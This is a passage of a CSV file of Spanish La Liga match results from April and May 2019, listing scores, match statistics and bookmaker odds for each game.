Madrid,Eibar,2,1,H,0,1,A,13,3,7,1,9,15,5,4,0,1,0,0,1.3,5.5,9.5,1.28,6,9.75,1.27,6,10,1.33,6.22,9.07,1.27,6,10,1.33,6,9.5,34,1.34,1.3,6.25,6,11.8,9.1,32,1.35,1.31,3.6,3.38,20,-1.5,1.86,1.81,2.1,2.05,1.41,5.26,7.38\r\nSP1,06/04/2019,Vallecano,Valencia,2,0,H,1,0,H,15,12,5,3,17,10,4,7,2,3,0,0,4.2,3.5,1.9,4,3.6,1.91,3.9,3.6,1.93,4.05,3.72,1.98,3.7,3.6,2,4,3.6,2,34,4.2,3.9,3.73,3.61,2.01,1.95,32,1.95,1.87,2.01,1.94,19,0.25,2.3,2.23,1.71,1.69,4.02,3.74,1.96\r\nSP1,07/04/2019,Alaves,Leganes,1,1,D,1,0,H,6,9,1,5,17,15,3,3,6,4,0,0,2.5,3,3.1,2.5,2.9,3.25,2.5,2.95,3.25,2.58,3.02,3.33,2.4,3.1,3.2,2.55,3,3.3,34,2.58,2.49,3.15,2.98,3.35,3.25,32,2.86,2.68,1.51,1.46,19,-0.25,2.16,2.11,1.82,1.78,2.5,3.03,3.39\r\nSP1,07/04/2019,Betis,Villarreal,2,1,H,1,1,D,17,10,7,4,15,14,4,3,4,4,0,0,2.2,3.4,3.3,2.2,3.4,3.3,2.25,3.4,3.15,2.3,3.64,3.19,2.25,3.4,3.2,2.25,3.5,3.13,34,2.35,2.27,3.64,3.46,3.3,3.17,32,1.9,1.85,2.05,1.96,19,-0.25,2,1.96,1.96,1.9,2.34,3.49,3.22\r\nSP1,07/04/2019,Celta,Sociedad,3,1,H,0,1,A,11,14,4,7,16,11,2,7,2,1,0,1,2.4,3.3,3,2.45,3.25,3,2.35,3.4,2.95,2.42,3.58,3.07,2.35,3.4,3,2.38,3.4,3,34,2.45,2.37,3.6,3.42,3.1,3.01,32,1.94,1.87,2.01,1.94,19,-0.25,2.1,2.05,1.86,1.82,2.45,3.39,3.12\r\nSP1,07/04/2019,Getafe,Ath Bilbao,1,0,H,0,0,D,6,9,2,1,16,18,1,2,2,1,0,0,2.3,3,3.5,2.35,2.9,3.6,2.35,2.9,3.55,2.44,3.01,3.6,2.3,3,3.5,2.38,3,3.6,34,2.44,2.36,3.1,2.97,3.65,3.51,32,3.04,2.82,1.46,1.42,19,-0.25,2.04,1.98,1.93,1.88,2.71,3,3.1\r\nSP1,07/04/2019,Levante,Huesca,2,2,D,1,0,H,14,17,8,4,22,12,9,1,2,4,0,0,1.95,3.6,3.8,1.95,3.6,3.8,1.97,3.7,3.6,2.02,3.91,3.71,1.95,3.75,3.7,1.95,3.8,3.6,34,2.05,1.98,3.91,3.74,3.8,3.64,33,1.71,1.67,2.3,2.2,19,-0.25,1.76,1.73,2.21,2.16,1.76,4.23,4.44\r\nSP1,07/04/2019,Valladolid,Sevilla,0,2,A,0,0,D,10,16,5,4,17,12,6,7,3,3,0,0,3.5,3.4,2.05,3.3,3.5,2.15,3.35,3.45,2.15,3.54,3.62,2.17,3.3,3.4,2.2,3.3,3.5,2.15,34,3.55,3.37,3.65,3.48,2.22,2.16,32,1.96,1.89,2,1.92,19,0.25,2.07,2,1.9,1.86,4.18,3.69,1.93\r\nSP1,13/04/2019,Ath Madrid,Celta,2,0,H,1,0,H,11,10,5,3,9,15,1,2,2,2,0,0,1.36,4.75,9,1.36,4.75,9.25,1.4,4.55,8.3,1.4,4.64,9.64,1.38,4.6,9,1.4,4.75,9.5,33,1.42,1.39,4.92,4.63,9.75,8.97,31,2.01,1.94,1.97,1.87,20,-1,1.7,1.65,2.41,2.31,1.5,4.29,7.74\r\nSP1,13/04/2019,Espanol,Alaves,2,1,H,1,0,H,6,14,2,3,12,17,4,8,3,2,0,0,1.8,3.5,4.75,1.78,3.5,5,1.83,3.45,4.7,1.82,3.54,5.12,1.8,3.5,4.75,1.83,3.6,4.8,33,1.86,1.82,3.65,3.49,5.12,4.8,32,2.35,2.28,1.67,1.63,18,-0.25,1.6,1.58,2.58,2.47,1.83,3.66,4.84\r\nSP1,13/04/2019,Huesca,Barcelona,0,0,D,0,0,D,6,10,1,2,18,13,6,5,1,2,0,0,4.75,4.2,1.65,4.75,4,1.7,5.2,4.2,1.6,4.71,4.16,1.74,5,4,1.67,4.75,4.2,1.73,33,5.2,4.7,4.2,4,1.76,1.72,31,1.66,1.62,2.47,2.3,20,1,1.77,1.7,2.31,2.23,3.02,3.55,2.43\r\nSP1,13/04/2019,Sevilla,Betis,3,2,H,1,0,H,11,12,5,7,18,8,5,4,6,3,0,0,1.66,4,5,1.67,4.1,4.75,1.7,4.1,4.5,1.72,4.26,4.71,1.67,4.2,4.8,1.73,4.2,4.8,33,1.73,1.7,4.3,4.13,5,4.65,31,1.62,1.58,2.6,2.38,20,-1,2.27,2.2,1.75,1.71,1.58,4.44,5.78\r\nSP1,14/04/2019,Ath Bilbao,Vallecano,3,2,H,1,1,D,15,8,9,4,10,16,3,6,1,3,0,1,1.6,4,5.5,1.65,4,5.25,1.63,4,5.3,1.64,4.18,5.51,1.63,4,5.25,1.67,4,5.5,33,1.7,1.64,4.2,4.02,5.72,5.35,31,1.85,1.8,2.1,2.02,20,-1,2.15,2.1,1.82,1.78,1.63,4.09,5.84\r\nSP1,14/04/2019,Girona,Villarreal,0,1,A,0,1,A,14,17,5,6,12,11,9,5,2,5,0,0,2.5,3.25,2.8,2.55,3.4,2.75,2.5,3.4,2.8,2.52,3.54,2.9,2.55,3.5,2.7,2.5,3.4,2.8,32,2.68,2.5,3.55,3.44,2.91,2.83,30,1.91,1.85,2.03,1.96,17,-0.25,2.22,2.15,1.79,1.75,2.7,3.48,2.72\r\nSP1,14/04/2019,Sociedad,Eibar,1,1,D,1,0,H,3,17,2,2,15,18,0,3,2,2,0,0,2.2,3.5,3.25,2.3,3.3,3.2,2.3,3.4,3.15,2.3,3.54,3.24,2.25,3.4,3.2,2.3,3.5,3,33,2.34,2.28,3.55,3.42,3.28,3.17,31,1.95,1.89,2,1.92,18,-0.5,2.35,2.27,1.72,1.67,2.53,3.27,3.09\r\nSP1,14/04/2019,Valencia,Levante,3,1,H,1,0,H,23,6,6,3,12,19,8,3,2,2,0,0,1.5,4.75,5.5,1.5,4.4,6.25,1.5,4.6,5.9,1.51,4.69,6.41,1.52,4.4,6,1.5,4.6,6,33,1.54,1.51,4.85,4.58,6.5,6.1,31,1.6,1.53,2.63,2.49,20,-1,1.84,1.8,2.11,2.07,1.49,4.42,7.48\r\nSP1,14/04/2019,Valladolid,Getafe,2,2,D,1,1,D,8,8,4,3,22,18,5,3,4,4,0,1,3.2,2.9,2.55,3.1,2.95,2.55,3.2,2.95,2.5,3.35,3.03,2.52,3.2,3,2.45,3.3,3,2.55,33,3.35,3.23,3.05,2.97,2.59,2.5,31,2.85,2.73,1.5,1.45,18,0.25,1.82,1.78,2.17,2.11,3.2,3,2.64\r\nSP1,15/04/2019,Leganes,Real Madrid,1,1,D,1,0,H,5,13,2,6,11,12,1,5,0,3,0,0,5.25,4.2,1.6,5,4.25,1.62,5,4.1,1.65,5.19,4.21,1.67,5.25,4.2,1.6,5.2,4.2,1.62,32,5.4,5.08,4.35,4.15,1.68,1.64,31,1.7,1.65,2.35,2.24,19,1,1.85,1.79,2.13,2.08,5.08,3.94,1.73\r\nSP1,19/04/2019,Alaves,Valladolid,2,2,D,2,1,H,10,12,4,7,17,16,5,7,3,5,0,0,2.1,3.2,3.75,2.1,3.2,3.9,2.15,3.1,3.8,2.2,3.23,3.83,2.15,3.1,3.75,2.2,3.2,3.8,35,2.23,2.17,3.23,3.15,3.9,3.75,33,2.55,2.45,1.6,1.55,19,-0.5,2.21,2.16,1.77,1.73,2.47,3.15,3.31\r\nSP1,20/04/2019,Barcelona,Sociedad,2,1,H,1,0,H,11,9,4,2,10,12,4,2,0,1,0,0,1.22,6.5,13,1.22,6.75,11.5,1.25,6.1,11,1.24,7.03,11.48,1.22,6.5,13,1.2,7,13,35,1.27,1.23,7.3,6.74,13,11.64,32,1.4,1.36,3.35,3.11,21,-2,2.1,2.03,1.88,1.83,1.17,8.47,15.44\r\nSP1,20/04/2019,Celta,Girona,2,1,H,1,0,H,13,9,8,1,7,10,5,1,2,1,0,0,2,3.75,3.5,2,3.7,3.6,1.97,3.7,3.65,2.03,3.88,3.63,1.95,3.75,3.7,2,3.8,3.75,35,2.05,2,3.9,3.72,3.8,3.61,34,1.72,1.68,2.3,2.18,19,-0.5,2.03,1.99,1.93,1.88,2.03,3.65,3.87\r\nSP1,20/04/2019,Eibar,Ath Madrid,0,1,A,0,0,D,10,8,2,4,11,12,5,8,3,1,0,0,3.2,3.1,2.4,3.2,3.1,2.4,3.1,3.1,2.5,3.21,3.13,2.54,3.1,3.1,2.45,3.25,3.1,2.5,35,3.25,3.12,3.25,3.11,2.6,2.47,33,2.45,2.37,1.65,1.58,19,0.25,1.84,1.79,2.15,2.1,3.8,3.32,2.17\r\nSP1,20/04/2019,Vallecano,Huesca,0,0,D,0,0,D,16,10,3,3,12,10,8,3,4,2,0,0,2.05,3.75,3.4,2.05,3.7,3.4,2.05,3.7,3.4,2.08,3.82,3.53,2.05,3.7,3.4,2.05,3.75,3.4,35,2.11,2.06,3.85,3.71,3.6,3.42,33,1.66,1.61,2.41,2.31,19,-0.5,2.1,2.05,1.87,1.82,2.11,3.85,3.44\r\nSP1,21/04/2019,Betis,Valencia,1,2,A,0,1,A,23,4,7,3,19,13,8,2,4,2,0,1,3,3.3,2.4,2.85,3.3,2.5,2.85,3.4,2.45,2.98,3.46,2.5,2.88,3.3,2.5,2.88,3.4,2.45,35,3,2.88,3.5,3.37,2.54,2.47,33,1.95,1.87,2,1.93,19,0.25,1.8,1.77,2.16,2.12,3.45,3.48,2.23\r\nSP1,21/04/2019,Getafe,Sevilla,3,0,H,2,0,H,10,12,3,2,19,15,2,7,3,6,1,1,3.1,3.4,2.3,3.1,3.3,2.35,3.15,3.25,2.35,3.17,3.39,2.41,3.1,3.3,2.35,3.13,3.3,2.38,34,3.22,3.12,3.47,3.3,2.43,2.35,33,2.2,2.1,1.79,1.74,18,0.5,1.68,1.63,2.4,2.34,3.09,3.27,2.53\r\nSP1,21/04/2019,Levante,Espanol,2,2,D,0,1,A,19,14,5,7,13,15,12,7,4,1,1,0,2.3,3.5,3,2.2,3.6,3.1,2.3,3.6,2.95,2.33,3.77,3.03,2.3,3.6,3,2.3,3.7,2.9,34,2.35,2.3,3.77,3.62,3.1,2.97,33,1.7,1.64,2.35,2.25,19,-0.5,2.35,2.29,1.7,1.66,2.37,3.47,3.17\r\nSP1,21/04/2019,Real Madrid,Ath Bilbao,3,0,H,0,0,D,11,5,4,3,12,16,8,2,2,4,0,0,1.45,4.33,7,1.45,4.4,7.5,1.55,4.2,5.8,1.51,4.38,7.22,1.44,4.6,7,1.5,4.6,6,35,1.55,1.49,4.75,4.41,7.7,6.67,34,1.59,1.53,2.65,2.48,21,-1,1.85,1.8,2.25,2.07,1.55,4.41,6.28\r\nSP1,21/04/2019,Villarreal,Leganes,2,1,H,0,0,D,11,6,5,2,12,15,7,4,2,1,0,0,1.72,3.5,5,1.72,3.75,5,1.75,3.7,4.8,1.79,3.81,4.81,1.83,3.7,4.33,1.75,3.7,4.75,34,1.9,1.78,3.85,3.67,5,4.71,33,2.13,2.05,1.85,1.78,18,-0.75,2.07,2.03,1.9,1.85,1.89,3.39,4.91\r\nSP1,23/04/2019,Alaves,Barcelona,0,2,A,0,0,D,6,17,1,6,19,9,1,4,3,1,0,0,7,5.25,1.4,7,5,1.42,6.2,5,1.45,7.5,5.06,1.43,7.5,5,1.4,7,5.2,1.44,34,7.55,6.96,5.3,5.01,1.45,1.43,34,1.55,1.5,2.75,2.56,21,1.5,1.79,1.74,2.2,2.14,7.9,4.61,1.45\r\nSP1,23/04/2019,Huesca,Eibar,2,0,H,0,0,D,12,7,3,4,16,16,5,3,4,1,0,0,2.25,3.5,3,2.35,3.4,3,2.3,3.55,2.95,2.33,3.69,3.08,2.3,3.5,3,2.38,3.6,3,35,2.45,2.33,3.77,3.55,3.16,3,34,1.74,1.7,2.3,2.16,18,-0.5,2.37,2.31,1.69,1.65,2.18,3.76,3.33\r\nSP1,23/04/2019,Valladolid,Girona,1,0,H,0,0,D,13,6,4,0,17,17,4,5,4,3,0,0,2.3,3.3,3.25,2.3,3.25,3.2,2.3,3.2,3.25,2.4,3.29,3.29,2.35,3.2,3.2,2.38,3.3,3.25,35,2.41,2.35,3.4,3.25,3.31,3.22,34,2.25,2.16,1.75,1.7,18,-0.5,2.41,2.35,1.67,1.63,2.47,3.27,3.19\r\nSP1,24/04/2019,Ath Madrid,Valencia,3,2,H,1,1,D,14,12,6,4,17,13,4,3,3,3,0,0,1.8,3.4,5,1.85,3.4,4.6,1.85,3.4,4.55,1.85,3.57,4.87,1.85,3.4,4.6,1.87,3.5,4.75,35,1.95,1.86,3.57,3.43,5,4.63,33,2.38,2.25,1.71,1.64,19,-1,2.8,2.66,1.55,1.5,1.86,3.45,4.97\r\nSP1,24/04/2019,Espanol,Celta,1,1,D,1,0,H,9,18,2,6,15,8,2,4,2,1,0,0,2.3,3.2,3.3,2.2,3.4,3.3,2.25,3.5,3.1,2.31,3.47,3.3,2.25,3.4,3.2,2.3,3.4,3.2,35,2.36,2.27,3.6,3.4,3.32,3.19,34,1.8,1.74,2.2,2.09,18,-0.5,2.31,2.27,1.72,1.67,2.13,3.59,3.61\r\nSP1,24/04/2019,Leganes,Ath Bilbao,0,1,A,0,1,A,14,3,1,2,11,14,2,2,1,2,0,0,2.6,3,3,2.65,3,2.95,2.65,2.95,2.95,2.77,3.07,2.96,2.7,3,2.88,2.7,3.1,2.9,35,2.78,2.69,3.1,2.99,3.05,2.93,33,2.8,2.63,1.52,1.47,18,-0.25,2.32,2.27,1.71,1.68,2.97,2.92,2.89\r\nSP1,24/04/2019,Levante,Betis,4,0,H,2,0,H,6,7,4,2,9,15,3,4,2,3,0,0,2.5,3.3,2.9,2.55,3.5,2.7,2.45,3.65,2.7,2.54,3.65,2.8,2.55,3.5,2.7,2.5,3.6,2.8,35,2.6,2.5,3.8,3.58,2.9,2.73,33,1.61,1.55,2.6,2.44,18,0,1.87,1.84,2.07,2.03,2.44,3.75,2.87\r\nSP1,25/04/2019,Getafe,Real Madrid,0,0,D,0,0,D,9,12,5,4,17,15,9,4,1,3,0,0,4,3.6,1.9,4.1,3.7,1.85,4.05,3.7,1.87,4.12,3.82,1.91,4,3.7,1.88,4,3.75,1.87,35,4.25,4.08,3.88,3.71,1.93,1.87,33,1.88,1.82,2.06,2,19,0.5,2.04,1.98,1.93,1.88,3.76,3.64,2.06\r\nSP1,25/04/2019,Sevilla,Vallecano,5,0,H,0,0,D,20,12,11,3,10,12,5,4,1,2,0,0,1.33,5.25,9,1.34,5.5,8,1.33,5.6,8.1,1.33,5.77,9.06,1.33,5.5,8.5,1.3,5.75,9.5,35,1.38,1.33,5.9,5.51,9.7,8.63,33,1.47,1.4,3.1,2.88,22,-1.5,2,1.88,2.05,1.97,1.24,7.22,11.48\r\nSP1,25/04/2019,Sociedad,Villarreal,0,1,A,0,0,D,13,8,2,3,11,14,6,3,2,3,0,0,2.5,3.3,2.9,2.4,3.5,2.9,2.45,3.45,2.85,2.5,3.51,2.94,2.45,3.4,2.88,2.45,3.5,2.8,35,2.51,2.43,3.6,3.46,3.04,2.88,33,1.85,1.79,2.11,2.03,18,0,1.83,1.79,2.15,2.1,2.85,3.42,2.62\r\nSP1,27/04/2019,Ath Bilbao,Alaves,1,1,D,1,1,D,14,14,1,3,14,17,8,6,2,2,0,0,1.45,4.2,7.5,1.5,4,6.5,1.53,4.05,6.9,1.52,4.46,6.82,1.47,4.2,7.5,1.53,4.2,7,34,1.55,1.52,4.46,4.13,7.5,6.86,33,2.25,2.16,1.75,1.7,21,-1,1.96,1.91,2.01,1.95,1.5,4.22,7.8\r\nSP1,27/04/2019,Ath Madrid,Valladolid,1,0,H,0,0,D,13,13,1,4,19,12,7,3,4,2,0,0,1.33,4.5,11,1.35,4.5,9.25,1.36,4.65,10,1.34,4.94,11.89,1.36,4.5,11,1.36,4.8,11,34,1.4,1.35,4.95,4.64,12.5,10.77,33,2.1,2.05,1.85,1.78,22,-1.5,2.2,2.13,1.8,1.75,1.35,4.63,12.87\r\nSP1,27/04/2019,Barcelona,Levante,1,0,H,0,0,D,23,7,12,2,17,12,6,3,4,3,0,0,1.2,6.5,11,1.22,6.25,10.5,1.27,6.2,9.8,1.28,6.33,10.46,1.25,6.5,10,1.25,6.5,11.5,34,1.29,1.26,6.75,6.23,11.5,10.41,33,1.41,1.38,3.2,3,21,-1.5,1.77,1.72,2.25,2.16,1.18,7.55,17.24\r\nSP1,27/04/2019,Leganes,Celta,0,0,D,0,0,D,10,8,1,2,16,5,4,6,1,0,0,0,2.37,3.25,3,2.35,3.2,3,2.45,3.1,3.1,2.53,3.25,3.1,2.45,3.2,3,2.5,3.25,3.1,34,2.54,2.46,3.28,3.18,3.2,3.07,32,2.48,2.35,1.65,1.59,18,-0.5,2.52,2.45,1.63,1.58,2.46,3.13,3.35\r\nSP1,28/04/2019,Girona,Sevilla,1,0,H,0,0,D,15,7,4,3,12,18,3,6,1,2,0,1,4.75,3.4,1.75,4.1,3.5,1.85,4.1,3.7,1.85,4.41,3.76,1.87,4.2,3.75,1.83,4.2,3.7,1.85,34,4.75,4.21,3.85,3.65,1.91,1.86,33,1.81,1.76,2.15,2.06,19,0.5,2.06,2.01,1.9,1.86,3.93,3.73,1.99\r\nSP1,28/04/2019,Sociedad,Getafe,2,1,H,1,0,H,11,12,7,3,17,14,5,7,2,3,0,0,2.6,3.2,2.75,2.55,2.95,2.95,2.6,3.1,2.9,2.62,3.29,2.89,2.45,3.2,3,2.6,3.13,2.9,34,2.68,2.57,3.29,3.17,3,2.91,32,2.5,2.39,1.63,1.57,18,-0.25,2.25,2.2,1.76,1.72,2.99,2.86,2.94\r\nSP1,28/04/2019,Valencia,Eibar,0,1,A,0,0,D,7,13,2,3,10,15,7,6,2,3,0,0,1.45,4.5,6.5,1.44,4.5,6.5,1.46,4.75,6.5,1.47,5.11,6.51,1.42,5,7,1.45,4.8,6.5,34,1.5,1.45,5.2,4.81,7,6.58,31,1.65,1.58,2.48,2.38,21,-1.5,2.32,2.23,1.75,1.68,1.49,4.48,7.25\r\nSP1,28/04/2019,Vallecano,Real Madrid,1,0,H,1,0,H,11,9,5,3,21,6,6,6,2,5,0,0,7.5,4.5,1.4,6.25,4.75,1.42,6.4,4.95,1.45,6.69,5.23,1.45,6.5,4.8,1.44,6.5,5,1.44,34,7.5,6.65,5.25,4.91,1.48,1.44,32,1.5,1.43,2.95,2.76,22,1.5,1.8,1.75,2.17,2.13,6.21,4.88,1.5\r\nSP1,28/04/2019,Villarreal,Huesca,1,1,D,1,0,H,18,13,5,3,15,22,0,1,5,2,0,1,1.55,4,6.5,1.55,4,5.75,1.57,4.4,5.4,1.59,4.54,5.57,1.55,4.4,5.5,1.57,4.4,5.4,34,1.61,1.58,4.57,4.3,6.5,5.52,32,1.62,1.59,2.5,2.37,21,-1,2.03,1.97,1.95,1.89,1.72,4.01,5.04\r\nSP1,29/04/2019,Betis,Espanol,1,1,D,0,1,A,18,10,5,4,16,14,6,5,4,1,0,0,2.3,3.3,3.1,2.3,3.3,3,2.3,3.45,3.05,2.24,3.65,3.27,2.25,3.5,3.1,2.25,3.5,3.13,32,2.35,2.27,3.65,3.45,3.27,3.11,30,1.87,1.81,2.1,2,17,-0.5,2.35,2.27,1.71,1.67,1.85,3.86,4.4\r\nSP1,03/05/2019,Sevilla,Leganes,0,3,A,0,2,A,7,9,3,5,11,23,3,4,1,1,0,0,1.36,5,8.5,1.36,5,8.75,1.4,4.75,7.9,1.39,5.17,8.22,1.4,4.75,8,1.4,5,8.5,35,1.44,1.39,5.2,4.9,9.15,8.21,33,1.8,1.69,2.3,2.18,22,-1.5,2.19,2.12,1.8,1.75,1.41,4.87,8.41\r\nSP1,04/05/2019,Alaves,Sociedad,0,1,A,0,1,A,17,9,6,2,7,22,13,6,1,3,0,0,2.5,3.25,2.9,2.6,3.1,2.9,2.55,3.2,2.9,2.64,3.3,2.92,2.6,3.2,2.8,2.63,3.25,2.9,35,2.66,2.58,3.3,3.2,2.95,2.88,34,2.25,2.18,1.75,1.68,18,0,1.86,1.83,2.1,2.04,2.81,3.23,2.78\r\nSP1,04/05/2019,Celta,Barcelona,2,0,H,0,0,D,14,8,6,1,11,13,11,1,1,5,0,0,2.15,3.6,3.25,2.1,3.6,3.4,2.15,3.6,3.3,2.15,3.77,3.38,2.15,3.6,3.3,2.15,3.7,3.4,35,2.17,2.12,3.8,3.65,3.48,3.32,33,1.75,1.7,2.25,2.15,19,-0.5,2.17,2.14,1.8,1.75,1.73,4.31,4.58\r\nSP1,04/05/2019,Espanol,Ath Madrid,3,0,H,1,0,H,11,11,5,3,11,14,5,6,1,2,0,0,3.8,3.3,2.05,3.7,3.3,2.1,3.7,3.25,2.1,3.94,3.32,2.12,3.75,3.25,2.1,3.7,3.4,2.15,35,3.94,3.69,3.4,3.28,2.2,2.12,34,2.33,2.23,1.7,1.65,19,0.5,1.81,1.77,2.16,2.11,4.17,3.54,1.98\r\nSP1,04/05/2019,Levante,Vallecano,4,1,H,2,0,H,12,20,7,3,17,12,6,7,1,4,0,1,1.95,3.8,3.6,1.95,4,3.5,1.97,3.9,3.5,1.98,4.17,3.56,1.95,4,3.5,1.95,4,3.7,35,2,1.95,4.17,3.96,3.7,3.52,34,1.55,1.5,2.7,2.54,19,-0.5,2,1.96,1.95,1.9,1.83,4.23,4.09\r\nSP1,05/05/2019,Eibar,Betis,1,0,H,1,0,H,14,12,6,6,15,7,11,8,3,2,0,0,2.05,3.6,3.5,2.05,3.6,3.5,2,3.6,3.6,2.04,3.78,3.69,2.05,3.6,3.5,2.05,3.6,3.8,35,2.08,2.03,3.78,3.59,3.8,3.59,33,1.81,1.76,2.15,2.06,18,-0.5,2.1,2.02,1.91,1.84,1.95,4,3.77\r\nSP1,05/05/2019,Getafe,Girona,2,0,H,1,0,H,13,4,8,2,15,13,1,3,3,3,0,1,1.8,3.6,4.75,1.78,3.5,5,1.8,3.4,4.85,1.85,3.39,5.19,1.75,3.5,5.25,1.83,3.5,5,35,1.87,1.81,3.6,3.44,5.25,4.9,33,2.41,2.33,1.65,1.6,19,-1,2.71,2.6,1.55,1.52,1.94,3.31,4.74\r\nSP1,05/05/2019,Huesca,Valencia,2,6,A,0,5,A,24,10,4,7,10,9,7,5,2,1,0,0,3.5,3.4,2.1,3.4,3.6,2.1,3.4,3.55,2.1,3.37,3.68,2.18,3.25,3.6,2.15,3.4,3.6,2.1,35,3.5,3.35,3.7,3.54,2.24,2.13,33,1.81,1.76,2.15,2.06,18,0.5,1.8,1.75,2.19,2.13,3.99,3.96,1.91\r\nSP1,05/05/2019,Real Madrid,Villarreal,3,2,H,2,1,H,24,15,11,7,9,14,8,3,0,3,0,0,1.7,4,4.75,1.67,4,5,1.7,4.05,4.7,1.7,4.1,5.07,1.65,4.2,4.8,1.7,4.3,4.8,35,1.75,1.69,4.3,4.04,5.07,4.78,33,1.55,1.49,2.75,2.58,20,-1,2.21,2.16,1.78,1.73,1.89,3.75,4.33\r\nSP1,05/05/2019,Valladolid,Ath Bilbao,1,0,H,1,0,H,10,9,3,1,14,22,1,3,5,5,0,0,2.9,3.1,2.6,2.8,3.1,2.7,2.85,3,2.65,2.89,3.18,2.75,2.8,3.1,2.7,2.8,3.1,2.7,35,3,2.84,3.18,3.07,2.76,2.68,32,2.65,2.52,1.56,1.52,17,-0.25,2.5,2.4,1.64,1.61,2.97,3.24,2.64\r\nSP1,12/05/2019,Ath Bilbao,Celta,3,1,H,3,0,H,8,3,4,2,16,18,3,3,4,3,0,0,2,3.5,3.8,2.05,3.4,3.75,2,3.4,3.85,2.02,3.58,3.96,2,3.5,3.9,1.95,3.5,3.9,35,2.05,2.01,3.6,3.45,4.05,3.84,34,2.15,2.09,1.8,1.74,18,-0.5,2.05,2,1.92,1.86,2.05,3.43,4.05\r\nSP1,12/05/2019,Ath Madrid,Sevilla,1,1,D,1,0,H,11,11,4,5,16,12,5,7,5,4,0,0,2.1,3.6,3.4,2.15,3.6,3.3,2.1,3.5,3.5,2.1,3.68,3.6,2.15,3.5,3.3,2.1,3.6,3.4,34,2.16,2.11,3.68,3.52,3.6,3.48,32,1.9,1.85,2.04,1.95,19,-0.5,2.15,2.09,1.85,1.78,1.97,3.7,4.01\r\nSP1,12/05/2019,Barcelona,Getafe,2,0,H,1,0,H,13,11,8,0,9,13,4,3,1,3,0,0,1.53,4.33,6,1.5,4.5,6.25,1.53,4.35,5.8,1.56,4.48,6.04,1.53,4.33,6,1.53,4.4,5.75,34,1.59,1.53,4.55,4.37,6.45,5.96,32,1.7,1.63,2.35,2.27,21,-1,1.93,1.87,2.04,1.98,1.48,4.47,7.66\r\nSP1,12/05/2019,Betis,Huesca,2,1,H,1,0,H,17,9,8,2,13,15,9,2,3,5,0,1,1.55,4.33,5.75,1.57,4.33,5.5,1.57,4.5,5.2,1.58,4.93,5.14,1.53,4.75,5.25,1.55,4.5,5.4,34,1.6,1.57,4.93,4.55,5.75,5.23,32,1.6,1.53,2.6,2.46,21,-1,2.01,1.95,1.98,1.91,1.51,4.87,6.1\r\nSP1,12/05/2019,Girona,Levante,1,2,A,0,0,D,14,6,6,2,15,16,9,2,2,3,0,0,2.15,3.6,3.2,2.25,3.4,3.2,2.2,3.65,3.1,2.27,3.58,3.28,2.2,3.5,3.2,2.2,3.6,3.1,34,2.28,2.22,3.75,3.58,3.28,3.15,33,1.66,1.62,2.4,2.29,19,-0.5,2.26,2.21,1.75,1.71,2.15,3.63,3.5\r\nSP1,12/05/2019,Leganes,Espanol,0,2,A,0,1,A,11,19,4,7,11,9,6,7,4,1,1,0,2.4,3.5,2.87,2.45,3.25,2.95,2.45,3.3,2.9,2.58,3.32,2.98,2.5,3.4,2.8,2.4,3.5,2.9,34,2.58,2.49,3.5,3.29,3,2.92,32,2.04,1.96,1.92,1.85,18,0,1.82,1.78,2.15,2.1,2.39,3.31,3.29\r\nSP1,12/05/2019,Sociedad,Real Madrid,3,1,H,1,1,D,19,6,7,2,12,16,5,2,1,2,0,1,3,3.6,2.3,2.9,3.75,2.3,2.95,3.7,2.25,3.09,3.86,2.26,3,3.7,2.25,3,3.75,2.25,34,3.11,3,3.86,3.69,2.35,2.26,32,1.62,1.57,2.5,2.4,19,0.5,1.72,1.68,2.31,2.25,2.72,3.95,2.48\r\nSP1,12/05/2019,Valencia,Alaves,3,1,H,2,1,H,10,10,4,3,9,14,7,4,2,5,0,0,1.4,5,7.5,1.4,5.25,7,1.4,5.1,7.5,1.41,5.48,7.14,1.38,5.25,7.5,1.36,5.2,8,34,1.43,1.39,5.5,5.14,8.5,7.52,32,1.65,1.6,2.45,2.34,22,-1.5,2.13,2.07,1.85,1.79,1.29,5.64,12.31\r\nSP1,12/05/2019,Vallecano,Valladolid,1,2,A,0,1,A,16,9,5,6,13,9,4,2,2,2,0,0,4.2,3.8,1.8,4.2,3.9,1.8,4.05,3.8,1.85,4.09,4.09,1.85,4,4,1.8,4.1,3.8,1.83,35,4.2,4.02,4.09,3.88,1.9,1.85,34,1.75,1.71,2.25,2.13,19,0.5,2.07,2.03,1.9,1.85,4.45,3.99,1.81\r\nSP1,12/05/2019,Villarreal,Eibar,1,0,H,0,0,D,11,4,3,0,11,14,5,3,3,2,0,0,1.6,4.33,5,1.6,4.4,5,1.6,4.25,5.1,1.61,4.7,5.08,1.62,4.4,4.8,1.62,4.33,5,35,1.65,1.61,4.7,4.36,5.3,5.01,33,1.6,1.55,2.55,2.43,21,-1,2.15,2.06,1.9,1.81,1.57,4.5,5.88\r\nSP1,18/05/2019,Alaves,Girona,2,1,H,1,0,H,14,13,7,4,13,10,6,4,3,3,0,0,2.25,3.5,3.1,2.3,3.5,3,2.3,3.5,3,2.38,3.66,3.01,2.3,3.5,3,2.38,3.6,3,39,2.38,2.31,3.75,3.56,3.1,2.99,37,1.81,1.76,2.15,2.05,19,-0.25,2.07,2.03,1.9,1.85,2.21,3.5,3.47\r\nSP1,18/05/2019,Celta,Vallecano,2,2,D,0,1,A,14,11,5,4,16,20,3,5,0,4,0,0,1.45,4.75,7,1.45,4.75,6.5,1.48,4.75,6,1.49,4.87,6.45,1.47,4.75,6.5,1.5,4.8,6.5,39,1.51,1.47,4.95,4.76,7,6.31,36,1.5,1.45,2.85,2.66,21,-1.5,2.3,2.23,1.75,1.69,1.32,5.94,9.12\r\nSP1,18/05/2019,Espanol,Sociedad,2,0,H,0,0,D,9,11,4,2,13,13,4,5,3,2,0,0,2.3,3.6,3,2.25,3.7,3,2.25,3.55,3,2.29,3.74,3.12,2.3,3.6,3,2.3,3.6,3.13,38,2.33,2.27,3.74,3.57,3.2,3.05,35,1.72,1.64,2.33,2.23,18,-0.25,2,1.98,1.93,1.89,2.03,3.91,3.61\r\nSP1,18/05/2019,Getafe,Villarreal,2,2,D,1,1,D,17,8,5,4,16,20,6,4,2,3,0,0,1.61,4.2,5.25,1.62,4.1,5.25,1.63,4.05,5.1,1.66,4.18,5.34,1.63,4,5.25,1.67,4.2,5.2,38,1.67,1.64,4.3,4.11,5.47,5.14,36,1.8,1.72,2.2,2.11,20,-1,2.19,2.13,1.85,1.76,1.58,4.43,5.81\r\nSP1,18/05/2019,Huesca,Leganes,2,1,H,0,1,A,15,9,6,1,18,12,4,6,0,1,0,0,2.5,3.75,2.62,2.5,3.7,2.65,2.5,3.55,2.7,2.59,3.72,2.71,2.5,3.6,2.7,2.55,3.75,2.7,39,2.6,2.5